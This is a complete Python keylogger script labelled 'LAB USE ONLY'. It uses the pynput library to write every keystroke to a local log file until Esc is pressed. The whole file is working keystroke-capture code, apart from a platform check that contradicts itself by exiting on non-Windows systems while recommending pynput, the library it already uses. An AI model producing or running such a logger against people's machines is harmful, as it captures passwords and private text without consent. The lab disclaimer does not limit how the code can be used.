#!/usr/bin/env python3
"""
Keylogger - LAB USE ONLY
For authorized security research and lab environments ONLY.
"""

import sys
if sys.platform != 'win32':
    print("This keylogger works on Windows. Use pynput on Linux/Mac.")
    sys.exit(1)

try:
    from pynput import keyboard
except ImportError:
    print("Run: pip install pynput")
    sys.exit(1)

LOG_FILE = "keystrokes.log"

def on_press(key):
    try:
        with open(LOG_FILE, 'a') as f:
            f.write(key.char)
    except AttributeError:
        with open(LOG_FILE, 'a') as f:
            f.write(f'[{key}]')

def on_release(key):
    if key == keyboard.Key.esc:
        return False

print("[!] LAB USE ONLY - Logging to", LOG_FILE)
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
